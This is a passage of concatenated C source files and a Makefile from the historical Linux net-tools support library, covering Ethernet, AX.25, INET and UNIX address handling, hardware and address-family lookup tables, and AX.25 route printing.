  }

  /* That's it.  Any trailing junk? */
  if ((i == ETH_ALEN) && (*bufp != '\0')) {
#ifdef DEBUG
	fprintf(stderr, NLS_CATGETS(catfd, etherSet, ether_debug4, "in_ether(%s): trailing junk!\n"), orig);
	errno = EINVAL;
	return(-1);
#endif
  }

#ifdef DEBUG
  fprintf(stderr, "in_ether(%s): %s\n", orig, pr_ether(sap->sa_data));
#endif

  return(0);
}


struct hwtype ether_hwtype = {
  "ether",	NULL, /*"10Mbps Ethernet",*/		ARPHRD_ETHER,	ETH_ALEN,
  pr_ether,	pr_sether,	in_ether,	NULL
};


#endif	/* HAVE_HWETHER */
/*
 * lib/ax25.c	This file contains an implementation of the "AX.25"
 *		support functions for the NET-2 base distribution.
 *
 * Version:	@(#)ax25.c	1.20	12/16/93
 *
 * NOTE:	I will redo this module as soon as I got the libax25.a
 *		library sorted out.  This library contains some useful
 *		and often used address conversion functions, database
 *		lookup stuff, and more of the like.
 *
 * Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993 MicroWalt Corporation
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#if HAVE_AFAX25 || HAVE_HWAX25
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/netdevice.h>
#include <linux/ax25.h>
#include <linux/if_arp.h>	/* ARPHRD_AX25 */
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <termios.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"


static char AX25_errmsg[128];


extern struct aftype ax25_aftype;


static char *
AX25_print(unsigned char *ptr)
{
  static char buff[8];
  int i;

  for (i = 0; i < 6; i++) {
	buff[i] = ((ptr[i] & 0377) >> 1);
	if (buff[i] == ' ') buff[i] = '\0';
  }
  buff[6] = '\0';
  i = ((ptr[6] & 0x1E) >> 1);
  if (i != 0) sprintf(&buff[strlen(buff)], "-%d", i);
  return(buff);
}


/* Display an AX.25 socket address. */
static char *
AX25_sprint(struct sockaddr *sap, int numeric)
{
  static char buf[64];

  if (sap->sa_family == 0xFFFF || sap->sa_family == 0)
    return(NLS_CATBUFF (catfd, ax25Set, ax25_none, "[NONE SET]", buf, 64));
  return(AX25_print(((struct sockaddr_ax25 *)sap)->sax25_call.ax25_call));
}


static int
AX25_input(int type, char *bufp, struct sockaddr *sap)
{
  unsigned char *ptr;
  char *orig, c;
  int i;

  sap->sa_family = ax25_aftype.af;
  ptr = ((struct sockaddr_ax25 *)sap)->sax25_call.ax25_call;

  /* First, scan and convert the basic callsign. */
  orig = bufp;
  i = 0;
  while((*bufp != '\0') && (*bufp != '-') && (i < 6)) {
	c = *bufp++;
	if (islower(c)) c = toupper(c);
	if (! (isupper(c) || isdigit(c))) {
		strcpy(AX25_errmsg, NLS_CATGETS (catfd, ax25Set, ax25_debug1, "Invalid callsign"));
#ifdef DEBUG
		fprintf(stderr, "ax25_input(%s): %s !\n", AX25_errmsg, orig);
#endif
		errno = EINVAL;
		return(-1);
	}
	*ptr++ = (unsigned char) ((c << 1) & 0xFE);
	i++;
  }

  /* Callsign too long? */
  if ((i == 6) && (*bufp != '-') && (*bufp != '\0')) {
	strcpy(AX25_errmsg, NLS_CATGETS (catfd, ax25Set, ax25_debug2, "Callsign too long"));
#ifdef DEBUG
	fprintf(stderr, "ax25_input(%s): %s !\n", AX25_errmsg, orig);
#endif
	errno = E2BIG;
	return(-1);
  }

  /* Nope, fill out the address bytes with blanks. */
  while (i++ < sizeof(ax25_address)-1) {
	*ptr++ = (unsigned char) ((' ' << 1) & 0xFE);
  }

  /* See if we need to add an SSID field. */
  if (*bufp == '-') {
	i = atoi(++bufp);
	*ptr = (unsigned char) ((i << 1) & 0xFE);
  } else {
	*ptr = (unsigned char) '\0';
  }

  /* All done. */
#ifdef DEBUG
  fprintf(stderr, "ax25_input(%s): ", orig);
  for (i = 0; i < sizeof(ax25_address); i++)
	fprintf(stderr, "%02X ", sap->sa_data[i] & 0377);
  fprintf(stderr, "\n");
#endif

  return(0);
}


/* Display an error message. */
static void
AX25_herror(char *text)
{
  if (text == NULL) fprintf(stderr, "%s\n", AX25_errmsg);
    else fprintf(stderr, "%s: %s\n", text, AX25_errmsg);
}


static char *
AX25_hprint(struct sockaddr *sap)
{
  static char buf[64];

  if (sap->sa_family == 0xFFFF || sap->sa_family == 0)
    return(NLS_CATBUFF (catfd, ax25Set, ax25_none, "[NONE SET]", buf, 64));
  return(AX25_print(((struct sockaddr_ax25 *)sap)->sax25_call.ax25_call));
}


static int
AX25_hinput(char *bufp, struct sockaddr *sap)
{
  if (AX25_input(0, bufp, sap) < 0) return(-1);
  sap->sa_family = ARPHRD_AX25;
  return(0);
}

#if 0
/* Set the line discipline of a terminal line. */
static int
KISS_set_disc(int fd, int disc)
{
  if (ioctl(fd, TIOCSETD, &disc) < 0) {
	fprintf(stderr, "KISS_set_disc(%d): %s\n", disc, strerror(errno));
	return(-errno);
  }
  return(0);
}


/* Start the KISS encapsulation on the file descriptor. */
static int
KISS_init(int fd)
{
  if (KISS_set_disc(fd, N_SLIP) < 0) return(-1);
  if (ioctl(fd, SIOCSIFENCAP, 4) <0) return(-1);
  return(0);
}
#endif

struct hwtype ax25_hwtype = {
  "ax25",	NULL, /*"AMPR AX.25",*/		ARPHRD_AX25,	7,
  AX25_print,	AX25_hprint,		AX25_hinput,	NULL
};

struct aftype ax25_aftype = {
  "ax25",	NULL, /*"AMPR AX.25",*/		AF_AX25,	7,
  AX25_print,	AX25_sprint,		AX25_input,	AX25_herror,	
  NULL
};

#endif	/* HAVE_xxAX25 */
/*
 * lib/hw.c	This file contains the top-level part of the hardware
 *		support functions module for the NET-2 base distribution.
 *
 * Version:	lib/hw.c 1.13 (1996-04-13)
 *
 * Maintainer:	Bernd 'eckes' Eckenfels, <net-tools@lina.inka.de>
 *
 * Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993 MicroWalt Corporation
 *
 * Changes:
 *960413 {1.13}	Mike Mclagan    :       DLCI/FRAD support
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include "config.h"
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"


extern	struct hwtype	unspec_hwtype;
extern	struct hwtype	loop_hwtype;

extern	struct hwtype	slip_hwtype;
extern	struct hwtype	cslip_hwtype;
extern	struct hwtype	slip6_hwtype;
extern	struct hwtype	cslip6_hwtype;
extern	struct hwtype	adaptive_hwtype;

extern	struct hwtype	ether_hwtype;
extern	struct hwtype	tr_hwtype;

extern	struct hwtype	ax25_hwtype;
extern  struct hwtype   netrom_hwtype;
extern  struct hwtype   tunnel_hwtype;

extern struct hwtype	ppp_hwtype;

extern struct hwtype	arcnet_hwtype;

extern struct hwtype   dlci_hwtype;
extern struct hwtype   frad_hwtype;

static struct hwtype *hwtypes[] = {

  &loop_hwtype,

#if HAVE_HWSLIP
  &slip_hwtype,
  &cslip_hwtype,
  &slip6_hwtype,
  &cslip6_hwtype,
  &adaptive_hwtype,
#endif
#if HAVE_HWETHER
  &ether_hwtype,
#endif
#if HAVE_HWTR
  &tr_hwtype,
#endif
#if HAVE_HWAX25
  &ax25_hwtype,
#endif
#if HAVE_HWNETROM
  &netrom_hwtype,
#endif
#if HAVE_HWTUNNEL
  &tunnel_hwtype,
#endif
#if HAVE_HWPPP
  &ppp_hwtype,
#endif  
#if HAVE_HWARC
  &arcnet_hwtype,
#endif  
#if HAVE_HWFR
  &dlci_hwtype,
  &frad_hwtype,
#endif
  &unspec_hwtype,
  NULL
};

static short sVhwinit = 0;

void hwinit ()
{
  loop_hwtype.title = NLS_CATSAVE (catfd, loopbackSet, loopback_loop, "Local Loopback");
#if HAVE_HWSLIP
  slip_hwtype.title = NLS_CATSAVE (catfd, slipSet, slip_slip, "Serial Line IP");
  cslip_hwtype.title = NLS_CATSAVE (catfd, slipSet, slip_cslip, "VJ Serial Line IP");
  slip6_hwtype.title = NLS_CATSAVE (catfd, slipSet, slip_slip6, "6-bit Serial Line IP");
  cslip6_hwtype.title = NLS_CATSAVE (catfd, slipSet, slip_cslip6, "VJ 6-bit Serial Line IP");
  adaptive_hwtype.title = NLS_CATSAVE (catfd, slipSet, slip_adaptive, "Adaptive Serial Line IP");
#endif
  unspec_hwtype.title = NLS_CATSAVE (catfd, loopbackSet, loopback_unspec, "UNSPEC");
#if HAVE_HWETHER
  ether_hwtype.title = NLS_CATSAVE (catfd, etherSet, ether_ether, "10Mbps Ethernet");
#endif
#if HAVE_HWAX25
  ax25_hwtype.title = NLS_CATSAVE (catfd, ax25Set, ax25_hw, "AMPR AX.25");
#endif
#if HAVE_HWNETROM
  netrom_hwtype.title = NLS_CATSAVE (catfd, netromSet, netrom_hw, "AMPR NET/ROM");
#endif
#if HAVE_HWTUNNEL
  tunnel_hwtype.title = NLS_CATSAVE (catfd, tunnelSet, tunnel_hw, "IPIP Tunnel");
#endif
#if HAVE_HWPPP
  ppp_hwtype.title = NLS_CATSAVE (catfd, pppSet, ppp_ppp, "Point-Point Protocol");
#endif  
#if HAVE_HWARC
  arcnet_hwtype.title = NLS_CATSAVE (catfd, arcnetSet, arcnet_arcnet, "1.5Mbps ARCnet");
#endif
#if HAVE_HWFR
   dlci_hwtype.title = NLS_CATSAVE(catfd, dlciSet, dlci_hw, "Frame Relay DLCI");
   frad_hwtype.title = NLS_CATSAVE(catfd, fradSet, frad_hw, "Frame Relay Access Device");
#endif
    sVhwinit = 1;
}

/* Check our hardware type table for this type. */
struct hwtype *
get_hwtype(const char *name)
{
  struct hwtype **hwp;

  if (!sVhwinit)
    hwinit();
  
  hwp = hwtypes;
  while (*hwp != NULL) {
	if (!strcmp((*hwp)->name, name)) return(*hwp);
	hwp++;
  }
  return(NULL);
}


/* Check our hardware type table for this type. */
struct hwtype *
get_hwntype(int type)
{
  struct hwtype **hwp;

  if (!sVhwinit)
    hwinit();

  hwp = hwtypes;
  while (*hwp != NULL) {
	if ((*hwp)->type == type) return(*hwp);
	hwp++;
  }
  return(NULL);
}
#
# lib/Makefile	Makefile for the net-lib function collection
#
# NET-LIB	A collection of functions used from the base set of the
#		NET-2 Networking Distribution for the LINUX operating
#		system.  (net-tools, net-drivers)
#
# Version:	lib/Makefile 1.27 (1996-04-13)
#
# Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
#		Copyright 1993 MicroWalt Corporation
#
# Modification:
#960125	{1.21}	Bernd Eckenfels:	reformated, layout
#960203 {1.22}	Bernd Eckenfels:	afrt.o will include all the 
#					routing support into the binaries.
#960206 {1.23}	Bernd Eckenfels:	better solution wit route_init
#960215 {1.24}	Bernd Eckenfels:	ax25_rt.o added
#960221 {1.25}	Bernd Eckenfels:	getroute/setroute.o
#960322 {1.26}	Bernd Eckenfels:	ACTOBJS support
#960413 {1.27}	Bernd Eckenfels:	Mike McLagan FRAD Support (frame.c)
#
#		This program is free software; you can redistribute it
#		and/or  modify it under  the terms of  the GNU General
#		Public  License as  published  by  the  Free  Software
#		Foundation;  either  version 2 of the License, or  (at
#		your option) any later version.
#


HWOBJS	 = hw.o loopback.o slip.o ether.o ax25.o ppp.o arcnet.o tr.o tunnel.o frame.o
AFOBJS	 = unix.o inet.o ax25.o ipx.o ddp.o ipx.o netrom.o af.o
AFGROBJS = inet_gr.o ipx_gr.o ddp_gr.o netrom_gr.o ax25_gr.o getroute.o
AFSROBJS = inet_sr.o netrom_sr.o ipx_sr.o setroute.o
ACTOBJS  = slip_ac.o ppp_ac.o activate.o
VARIA	 = getargs.o masq_info.o
NLSMISC  = net-string.o

OBJS	= $(NLSMISC) $(VARIA) $(AFOBJS) $(HWOBJS) \
		$(AFGROBJS) $(AFSROBJS) $(ACTOBJS)


# This can be overwritten by the TOPLEVEL Makefile
TOPDIR=..
COPTS = -O2 -Wall -fomit-frame-pointer #-DDEBUG
LOPTS = -s

CFLAGS  = $(COPTS) -I. -I$(TOPDIR)
LDFLAGS = $(LOPTS)

all:	libsupport.a

libsupport.a:	Makefile $(TOPDIR)/config.h $(OBJS)
			@echo Building libsupport.a
			@rm -f libsupport.a
			@ar rcs libsupport.a $(OBJS)
			@ranlib libsupport.a

clean:
		rm -f *.o *~ *.orig

clobber:	clean
		rm -f *.a

# End of lib/Makefile.
/*
 * lib/ax25_gr.c	This file contains an implementation of the "AX.25"
 *			route print support functions.
 *
 * Version:	lib/ax25_gr.c 1.01 (1996-02-15)
 *
 * Author:	Bernd Eckenfels, <ecki@lina.inka.de>
 *		Copyright 1999 Bernd Eckenfels, Germany
 *		base on Code from Jonathan Naylor <jsn@Cs.Nott.AC.UK>
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#if HAVE_AFAX25
#if 0
#include <sys/types.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/ax25.h>
#include <linux/if_arp.h>	/* ARPHRD_AX25 */
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <string.h>
#include <termios.h>
#endif
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"

int AX25_rprint(int options)
{
	FILE *f=fopen(_PATH_PROCNET_AX25_ROUTE, "r");
	char buffer[256];
	int  use;

	if(f==NULL)
	{
		printf(NLS_CATGETS(catfd, netstatSet, netstat_noax25, "AX.25 not configured in this system.\n")); /* xxx */
		return 1;
	}
	printf(NLS_CATGETS(catfd, netstatSet, netstat_ax25, "Kernel AX.25 routing table\n")); /* xxx */
	printf(NLS_CATGETS(catfd, netstatSet, netstat_header_ax25, "Destination  Iface    Use\n")); /* xxx */
	fgets(buffer,256,f);
	while(fgets(buffer,256,f))
	{
		buffer[9]=0;
		buffer[14]=0;
		use=atoi(buffer+15);
		printf("%-9s    %-5s  %5d\n",
			buffer,buffer+10,use);
	}
	fclose(f);
	return 0;
}

#endif	/* HAVE_AFAX25 */
/*
 * lib/inet.c	This file contains an implementation of the "INET"
 *		support functions for the net-tools.
 *		(NET-3 base distribution).
 *
 * Version:	lib/inet.c 1.26 1996-03-29
 *
 * Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993 MicroWalt Corporation
 *
 * Modified:
 *960113 {1.21}	Bernd Eckenfels :	rresolve cache bug.
 *960128 {1.22}	Bernd Eckenfels :	endian bug in print
 *960203 {1.23} Bernd Eckenfels :       net-features support
 *960217 {1.24} Bernd Eckenfels :	get_sname
 *960219 {1.25} Bernd Eckenfels :	extern int h_errno
 *960329 {1.26} Bernd Eckenfels :	resolve 255.255.255.255	
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#if HAVE_AFINET
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <linux/route.h>
#include <ctype.h>
#include <errno.h>
#include <netdb.h>
#include <resolv.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include "version.h"
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"

extern int h_errno;  /* some netdb.h versions don't export this */

struct addr {
  struct sockaddr_in	addr;
  char			*name;
  struct addr		*next;
};

struct service {
  int number;
  char *name;
  struct service *next;
};

static struct service *tcp_name = NULL,
		      *udp_name = NULL,
		      *raw_name = NULL;


static struct addr *INET_nn = NULL;	/* addr-to-name cache		*/


static int
INET_resolve(char *name, struct sockaddr_in *sin)
{
  struct hostent *hp;
  struct netent *np;

  /* Grmpf. -FvK */
  sin->sin_family = AF_INET;
  sin->sin_port = 0;

  /* Default is special, meaning 0.0.0.0. */
  if (!strcmp(name, "default")) {
	sin->sin_addr.s_addr = INADDR_ANY;
	return(1);
  }

  /* gethostbyname doesnt resolve this (Pavel Krauz) */
  if (!(strcmp(name, "255.255.255.255"))) {
         sin->sin_addr.s_addr = htonl(INADDR_BROADCAST);
         return (1);
  }
 
  /* Try the NETWORKS database to see if this is a known network. */
  if ((np = getnetbyname(name)) != (struct netent *)NULL) {
	sin->sin_addr.s_addr = htonl(np->n_net);
	strcpy(name, np->n_name);
	return(1);
  }

#ifdef DEBUG
  res_init();
  _res.options |= RES_DEBUG;
#endif

  if ((hp = gethostbyname(name)) == (struct hostent *)NULL) {
	errno = h_errno;
	return(-1);
  }
  memcpy((char *) &sin->sin_addr, (char *) hp->h_addr_list[0], hp->h_length);
  strcpy(name, hp->h_name);
  return(0);
}


static int
INET_rresolve(char *name, struct sockaddr_in *sin, int numeric)
{
  struct hostent *ent;
  struct netent *np;
  struct addr *pn;
  unsigned long ad, host_ad;

  /* Grmpf. -FvK */
  if (sin->sin_family != AF_INET) {
#ifdef DEBUG
	fprintf(stderr, NLS_CATGETS(catfd, inetSet, inet_debug1, "rresolve: unsupport address family %d !\n"),
							sin->sin_family);
#endif
	errno = EAFNOSUPPORT;
	return(-1);
  }

  ad = (unsigned long) sin->sin_addr.s_addr;
  if (ad == INADDR_ANY) {
	if ((numeric & 0x7FFF) == 0) {
		if (numeric & 0x8000) strcpy(name, "default");
		  else strcpy(name, "*");
		return(0);
	}
  }
  if (numeric & 0x7FFF) {
	strcpy(name,inet_ntoa (sin->sin_addr));
	return(0);
  }

#if 0
  INET_nn = NULL;
#endif
  pn = INET_nn;
  while (pn != NULL) {
	if (pn->addr.sin_addr.s_addr == ad) {
		strcpy(name, pn->name);
		return(0);
	}
	pn = pn->next;
  }

  host_ad = ntohl(ad);
  np = NULL;
  ent = NULL;
  if ((host_ad & 0xFF) != 0)  {
	ent = gethostbyaddr((char *) &ad, 4, AF_INET);
	if (ent != NULL)
		strcpy(name, ent->h_name);
  } else {
	np = getnetbyaddr(host_ad, AF_INET);
	if (np != NULL) {
		strcpy(name, np->n_name);
	}
  }
  if ((ent == NULL) && (np == NULL)) {
	strcpy(name,inet_ntoa (sin->sin_addr));
  }
  pn = (struct addr *)malloc(sizeof(struct addr));
  pn->addr = *sin;
  pn->next = INET_nn;
  pn->name = (char *) malloc(strlen(name) + 1);
  strcpy(pn->name, name);
  INET_nn = pn;

  return(0);
}


static void
INET_reserror(char *text)
{
  herror(text);
}


/* Display an Internet socket address. */
static char *
INET_print(unsigned char *ptr)
{
  return(inet_ntoa((*(struct in_addr *) ptr)));
}


/* Display an Internet socket address. */
static char *
INET_sprint(struct sockaddr *sap, int numeric)
{
  static char buff[128];

  if (sap->sa_family == 0xFFFF || sap->sa_family == 0)
    return(NLS_CATBUFF (catfd, inetSet, inet_none, "[NONE SET]", buff, 128));
  if (INET_rresolve(buff, (struct sockaddr_in *) sap, numeric) != 0)
							return(NULL);
  return(buff);
}


static int
INET_getsock(char *bufp, struct sockaddr *sap)
{
  char *sp = bufp,*bp;
  int i;
  unsigned val;
  struct sockaddr_in *sin;
  
  sin             = (struct sockaddr_in *) sap;
  sin->sin_family = AF_INET;
  sin->sin_port   = 0;

  val = 0;
  bp=(char *)&val;
  for (i = 0; i < sizeof(sin->sin_addr.s_addr); i++) {
	*sp = toupper(*sp);
	
	if ((*sp >= 'A') && (*sp <= 'F')) 
		bp[i] |= (int) (*sp - 'A') + 10;
	else if ((*sp >= '0') && (*sp <= '9'))
		bp[i] |= (int) (*sp - '0');
	else
		return(-1);

	bp[i] <<= 4;
	sp++;
	*sp = toupper(*sp);
	
	if ((*sp >= 'A') && (*sp <= 'F')) 
		bp[i] |= (int) (*sp - 'A') + 10;
	else if ((*sp >= '0') && (*sp <= '9'))
		bp[i] |= (int) (*sp - '0');
	else
		return(-1);
	
	sp++;
    }
    sin->sin_addr.s_addr = htonl (val);

    return(sp-bufp);
}

static int
INET_input(int type, char *bufp, struct sockaddr *sap)
{
  switch(type) {
  	case 1:
		return(INET_getsock(bufp,sap));
	default:
		return(INET_resolve(bufp, (struct sockaddr_in *) sap));
  }
}


struct aftype inet_aftype = {
  "inet",	NULL, /*"DARPA Internet",*/	AF_INET,	sizeof(unsigned long),
  INET_print,	INET_sprint,		INET_input,	INET_reserror,	
  NULL/*INET_rprint*/,	NULL/*INET_rinput*/
};


static void
add2list(struct service **namebase, struct service *item) 
{
  if (*namebase == NULL) {
	*namebase = item;
	item->next = NULL;
  } else {
	item->next = *namebase;
	*namebase = item;
  } 
}


static struct service *
searchlist(struct service *servicebase, int number)
{
  struct service *item;

  for(item = servicebase; item != NULL; item = item->next) {
	if (item->number == number) return(item);
  }
  return(NULL);
}


static int
read_services(void)
{
  struct servent *se;
  struct service *item;

  setservent(1);
  while((se=getservent())) {
	/* Allocate a service entry. */
	item = (struct service *) malloc(sizeof(struct service));
	if (item == NULL) perror("netstat"); 
	item->name = strdup(se->s_name);
	item->number = se->s_port;

	/* Fill it in. */
	if (! strcmp(se->s_proto, "tcp")) {
		add2list(&tcp_name,item);
	} else if (! strcmp(se->s_proto, "udp")) {
		add2list(&udp_name,item);
	} else if (! strcmp(se->s_proto, "raw")) {
		add2list(&raw_name,item);
	}
  }
  endservent();
  return(0);
}


char *
get_sname(int socknumber, char *proto, int numeric)
{
  static char buffer[64], init=0;
  struct service *item;

  if (socknumber == 0) return("*");
  if (numeric) {
	sprintf(buffer, "%d", ntohs(socknumber));
	return(buffer);
  }
  if (!init) {
  	(void)read_services();
  	init=1;
  }
  buffer[0]='\0';
  if (! strcmp(proto, "tcp")) {
	if ((item = searchlist(tcp_name, socknumber)) != NULL)
		sprintf(buffer, "%s", item->name);
  } else if (! strcmp(proto, "udp")) {
	if ((item = searchlist(udp_name, socknumber)) != NULL)
		sprintf(buffer, "%s", item->name);
  } else if (! strcmp(proto, "raw")) {
	if ((item = searchlist(raw_name, socknumber)) != NULL)
		sprintf(buffer, "%s", item->name);

  }
  if (!buffer[0])
  	sprintf(buffer, "%d", ntohs(socknumber));
  return(buffer);
}

#endif	/* HAVE_AFINET */
/*
 * lib/unix.c	This file contains the general hardware types.
 *
 * Version:	@(#)unix.c	1.10	10/07/93
 *
 * Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993 MicroWalt Corporation
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include "config.h"

#include <sys/types.h>
#include <sys/socket.h>
#if HAVE_AFUNIX
#   include <sys/un.h>
#endif
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"


/* Display an UNSPEC address. */
static char *
UNSPEC_print(unsigned char *ptr)
{
  static char buff[64];
  char *pos;
  int i;

  pos = buff;
  for(i = 0; i < sizeof(struct sockaddr); i++) {
	pos += sprintf(pos, "%02X-", (*ptr++ & 0377));
  }
  buff[strlen(buff) - 1] = '\0';
  return(buff);
}


/* Display an UNSPEC socket address. */
static char *
UNSPEC_sprint(struct sockaddr *sap, int numeric)
{
  static char buf[64];

  if (sap->sa_family == 0xFFFF || sap->sa_family == 0)
    return(NLS_CATBUFF (catfd, unixSet, unix_none, "[NONE SET]", buf, 64));
  return(UNSPEC_print(sap->sa_data));
}


#if HAVE_AFUNIX

/* Display a UNIX domain address. */
static char *
UNIX_print(unsigned char *ptr)
{
  return(ptr);
}


/* Display a UNIX domain address. */
static char *
UNIX_sprint(struct sockaddr *sap, int numeric)
{
  static char buf[64];

  if (sap->sa_family == 0xFFFF || sap->sa_family == 0)
    return(NLS_CATBUFF (catfd, unixSet, unix_none, "[NONE SET]", buf, 64));
  return(UNIX_print(sap->sa_data));
}


struct aftype unix_aftype = {
  "unix",	NULL, /*"UNIX Domain",*/		AF_UNIX,	0,
  UNIX_print,	UNIX_sprint,		NULL,		NULL,
  NULL
};
#endif	/* HAVE_AFUNIX */


struct aftype unspec_aftype = {
  "unspec",	NULL, /*"UNSPEC",*/		AF_UNSPEC,	0,
  UNSPEC_print,	UNSPEC_sprint,		NULL,		NULL,	
  NULL
};
#include "config.h"

#if HAVE_AFATALK
#include <sys/types.h>
#include <sys/socket.h>
#include <linux/atalk.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"

int DDP_rprint(int options)
{
	fprintf(stderr,NLS_CATGETS(catfd, ddpSet, ddp_notyet,
		"Routing table for `ddp' not yet supported.\n"));
	return(1);
}
#endif
/*
 * lib/af.c	This file contains the top-level part of the protocol
 *		support functions module for the NET-2 base distribution.
 *
 * Version:	lib/af.c 1.13 (1996-02-21)
 *
 * Author:	Fred N. van Kempen, <waltje@uwalt.nl.mugnet.org>
 *		Copyright 1993 MicroWalt Corporation
 *
 *		This program is free software; you can redistribute it
 *		and/or  modify it under  the terms of  the GNU General
 *		Public  License as  published  by  the  Free  Software
 *		Foundation;  either  version 2 of the License, or  (at
 *		your option) any later version.
 */
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <stdio.h>
#include <errno.h>
#include <ctype.h>
#include <string.h>
#include <unistd.h>
#include "config.h"
#include "net-support.h"
#include "pathnames.h"
#define  EXTERN
#include "net-locale.h"


int flag_unx = 0;
int flag_ipx = 0;
int flag_ax25 = 0;
int flag_ddp = 0;
int flag_netrom = 0;
int flag_inet = 0;


struct aftrans_t {
	char *alias;
	char *name;
	int  *flag;
} aftrans[]={
	{"ax25",	"ax25",		&flag_ax25},
	{"ip",		"inet",		&flag_inet},
	{"ipx",		"ipx",		&flag_ipx},
	{"appletalk",	"ddp",		&flag_ddp},
	{"netrom",	"netrom",	&flag_netrom},
	{"inet",	"inet",		&flag_inet},
	{"ddp",		"ddp",		&flag_ddp},
	{"unix",	"unix",		&flag_unx},
	{"tcpip",	"inet",		&flag_inet},
	{0,		0,		0}
};

char		afname[256]="";

extern	struct aftype	unspec_aftype;
extern	struct aftype	unix_aftype;
extern	struct aftype	inet_aftype;
extern	struct aftype	ax25_aftype;
extern	struct aftype	netrom_aftype;
extern	struct aftype	ipx_aftype;
extern	struct aftype	ddp_aftype;

static short sVafinit = 0;

static struct aftype *aftypes[] = {
#if HAVE_AFUNIX
  &unix_aftype,
#endif
#if HAVE_AFINET
  &inet_aftype,
#endif
#if HAVE_AFAX25
  &ax25_aftype,
#endif
#if HAVE_AFNETROM
  &netrom_aftype,
#endif
#if HAVE_AFIPX
  &ipx_aftype,
#endif
#if HAVE_AFATALK
  &ddp_aftype,
#endif    
  &unspec_aftype,
  NULL
};

void afinit ()
{
  unspec_aftype.title = NLS_CATSAVE (catfd, unixSet, unix_unspec, "UNSPEC");
#if HAVE_AFINET
  unix_aftype.title = NLS_CATSAVE (catfd, unixSet, unix_unix, "UNIX Domain");
#endif
#if HAVE_AFINET
  inet_aftype.title = NLS_CATSAVE (catfd, inetSet, inet_darpa, "DARPA Internet");
#endif
#if HAVE_AFAX25
  ax25_aftype.title = NLS_CATSAVE (catfd, ax25Set, ax25_ax25, "AMPR AX.25");
#endif
#if HAVE_AFNETROM
  netrom_aftype.title = NLS_CATSAVE (catfd, netromSet, netrom_netrom, "AMPR NET/ROM");
#endif
#if HAVE_AFIPX
  ipx_aftype.title = NLS_CATSAVE (catfd, ipxSet, ipx_ipx, "IPX");
#endif
#if HAVE_AFATALK
  ddp_aftype.title = NLS_CATSAVE (catfd, ddpSet, ddp_ddp, "Appletalk DDP");
#endif
  sVafinit = 1;
}

/* set the default AF list from the program name or a constant value	*/
void
aftrans_def(char *tool, char *argv0, char *dflt)
{
  char *tmp;
  char *buf;
  
  strcpy(afname, dflt);

  if (!(tmp = strrchr(argv0, '/')))
  	tmp = argv0; 			/* no slash?! */
  else
  	tmp++;
  
  if (!(buf = strdup(tmp)))
  	return;

  if (strlen(tool) >= strlen(tmp)) {
  	free(buf);
  	return;
  }
  tmp = buf+(strlen(tmp)-strlen(tool));
  
  if (strcmp(tmp, tool)!=0) {
  	free(buf);
  	return;
  }
  
  *tmp = '\0';
  if ((tmp = strchr(buf,'_')))
  	*tmp = '\0';
  
  afname[0]='\0';
  if (aftrans_opt(buf))
   	strcpy(afname, buf);

  free(buf);
}


/* Check our protocol family table for this family. */
struct aftype *
get_aftype(const char *name)
{
  struct aftype **afp;

  if (!sVafinit)
    afinit ();
  
  afp = aftypes;
  while (*afp != NULL) {
	if (!strcmp((*afp)->name, name)) return(*afp);
	afp++;
  }
  if (index(name,','))
  	fprintf(stderr,NLS_CATGETS(catfd, libSet, lib_toomuch, "Please don't supply more than one address family.\n"));
  return(NULL);
}


/* Check our protocol family table for this family. */
struct aftype *
get_afntype(int af)
{
  struct aftype **afp;

  if (!sVafinit)
    afinit ();
  
  afp = aftypes;
  while (*afp != NULL) {
	if ((*afp)->af == af) return(*afp);
	afp++;
  }
  return(NULL);
}


int aftrans_opt(const char *arg)
{
